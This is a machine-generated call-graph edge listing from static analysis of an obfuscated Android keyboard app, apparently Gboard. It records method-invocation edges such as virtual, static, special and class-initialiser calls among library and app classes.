VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int b(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int b(java.lang.Class)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: boolean hasNext()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r5, $i6, $i1) in <ljf: boolean add(java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: java.lang.Object[] s()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r2.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: boolean add(java.lang.Object)> ==> <java.lang.UnsupportedOperationException: void <init>()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljf: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke $r23.<mag: void <init>(java.lang.String,int,int)>("PLAYSTORE_STICKER_IMAGE", 23, 23) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.LinkageError: void <init>()>() in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.LinkageError: void <init>()>
SPECIAL edge: specialinvoke r0.<lka: void <init>()>() in <mii: void <init>()> ==> <lka: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfc: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r2) in <ivv: ivw a()> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r11.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_METADATA", 11, 11) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("iw", "he") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <ljf: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lwa: void <init>()>() in <lwa: void <clinit>()> ==> <lwa: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <ljf: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, 0) in <lql: void <clinit>()> ==> <lql: void <init>(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("in", "id") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashMap: void <init>(int,float)>($i0, 1.0F) in <ljd: java.util.Map n(int)> ==> <java.util.LinkedHashMap: void <init>(int,float)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>($r0, $r1, $i0, $r2) in <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i2, $i7) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
CLINIT edge: staticinvoke <ose: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ose: void <clinit>()>
STATIC edge: $r3 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <iwt: java.lang.String c(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int j()> ==> <java.lang.UnsupportedOperationException: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r0.<java.util.List: boolean isEmpty()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: boolean isEmpty()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c2) in <ivw: boolean v(java.lang.String)> ==> <ivw: boolean u(char)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <ljf: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(0) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r3.<java.lang.AssertionError: void <init>(java.lang.Object)>($r1) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(10) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
SPECIAL edge: specialinvoke $r2.<lfc: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfc: void <init>(lfa)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>("unbounded recursion in log statement", r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int a(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int a(java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkt: void e(int)>($i0) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <lkt: void e(int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
STATIC edge: $r7 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r6) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: specialinvoke $r4.<j$.util.concurrent.v: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.v: void <init>()>
SPECIAL edge: $r12 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r10, $i3) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>($r2, $i1, $i0) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.v: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[])> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<java.lang.StringBuilder: void <init>()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r3, "logSiteKey") in <lsn: boolean ac()> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<ltf: void <init>(lto)>($r1) in <lth: void <init>(lto)> ==> <ltf: void <init>(lto)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkt: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void j(int[],int[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(6) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <liz: boolean hasNext()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqm: int size()>
SPECIAL edge: specialinvoke $r2.<lsk: void <init>(java.lang.Class)>(class "Llvt;") in <lsl: void <clinit>()> ==> <lsk: void <init>(java.lang.Class)>
SPECIAL edge: specialinvoke $r5.<java.util.WeakHashMap: void <init>()>() in <hcb: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(5) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int d(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: int d(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
STATIC edge: staticinvoke <java.lang.Thread: void yield()>() in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <java.lang.Thread: void yield()>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("initialized", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<liz: void <init>(ljd)>($r1) in <liw: void <init>(ljd)> ==> <liz: void <init>(ljd)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int c()>() in <ljd: java.util.Map m()> ==> <ljd: int c()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorFeaturedMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r1.<jlu: void <init>(int)>(9) in <lvt: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $l0 = staticinvoke <android.os.SystemClock: long elapsedRealtime()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <android.os.SystemClock: long elapsedRealtime()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma g()>() in <lkx: lma q()> ==> <lqq: lma g()>
SPECIAL edge: specialinvoke $r2.<j$.sun.misc.b: void <init>(sun.misc.Unsafe)>($r4) in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: void <init>(sun.misc.Unsafe)>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/libs/framework/core/AppBase") in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object h(int)>($i0) in <ljb: void a()> ==> <ljd: java.lang.Object h(int)>
STATIC edge: $z0 = staticinvoke <lri: boolean V(java.util.List,java.lang.Object)>(r0, $r1) in <lkq: boolean equals(java.lang.Object)> ==> <lri: boolean V(java.util.List,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <lma: lma r(java.lang.Object)>($r5) in <lly: lma g()> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
STATIC edge: staticinvoke <izw: void as(int,java.lang.String)>($i0, "initialCapacity") in <lkg: void <init>(int)> ==> <izw: void as(int,java.lang.String)>
SPECIAL edge: specialinvoke $r20.<mag: void <init>(java.lang.String,int,int)>("NATIVE_CARD", 20, 20) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <lum: lto d(java.lang.String)>($r2) in <lth: lth i(java.lang.String)> ==> <lum: lto d(java.lang.String)>
VIRTUAL edge: $r18 = virtualinvoke r0.<lsn: lsc c()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsf: lsc c()>
STATIC edge: $r1 = staticinvoke <iwt: java.lang.String d(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <iwt: java.lang.String d(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <ltc: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r6.<lkt: void a(java.lang.Object,java.lang.Object)>($r3, $r11) in <lmb: lme f()> ==> <lkt: void a(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <ljf: void q(int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(short[],short[])>($r6, $r7) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(short[],short[])>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentMask", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(11) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r15 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<qj: void <init>()>() in <qc: void <init>()> ==> <qj: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.util.Iterator l()>() in <liy: java.util.Iterator iterator()> ==> <ljd: java.util.Iterator l()>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <ljd: void A(int)>
SPECIAL edge: specialinvoke $r1.<lqm: void <init>(lqn)>(r0) in <lqn: lkq f()> ==> <lqm: void <init>(lqn)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(18) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: java.lang.String replace(char,char)>
CLINIT edge: staticinvoke <lvt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvt: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<lte: void <init>()>() in <ltf: void <clinit>()> ==> <lte: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r2) in <lwf: void <clinit>()> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_THUMBNAIL", 7, 7) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Object clone()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <lsh: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lme: lma d(java.lang.Object)> ==> <lqq: java.lang.Object get(java.lang.Object)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_UserUnlocked", $r2) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r8.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r0.<lqc: void <init>()>() in <lqc: void <clinit>()> ==> <lqc: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r8, $r3) in <lqs: boolean containsAll(java.util.Collection)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljf: void j(int,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "baseCount") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <coo: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r3 = staticinvoke <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>($r5, $r2) in <lmb: lme f()> ==> <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/LatinApp") in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("stack_size", class "Lltc;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>($r3, r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
SPECIAL edge: specialinvoke r0.<ivv: void <init>()>() in <ivv: void <init>(byte[])> ==> <ivv: void <init>()>
CLINIT edge: staticinvoke <hfd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hfd: void <clinit>()>
SPECIAL edge: specialinvoke $r17.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_AUTOCOMPLETE", 17, 17) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $i0 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkt: void e(int)> ==> <lkg: int a(int,int)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(7) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int size()>() in <ljd: boolean isEmpty()> ==> <ljd: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<qj: int b(java.lang.Object)>($r2) in <qj: java.lang.Object get(java.lang.Object)> ==> <qj: int b(java.lang.Object)>
SPECIAL edge: $r4 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lsz: java.lang.Object d(java.lang.Object)>($r3) in <lsm: java.lang.Object d(lsz)> ==> <lsz: java.lang.Object d(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<lmo: boolean containsAll(java.util.Collection)>($r10) in <lqs: boolean containsAll(java.util.Collection)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
CLINIT edge: staticinvoke <dwx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dwx: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lkg: void g(int)>($i0) in <lkg: void c(java.lang.Object)> ==> <lkg: void g(int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(18) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean z(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<ljd: int d(int)>($i0) in <liz: java.lang.Object next()> ==> <ljd: int d(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
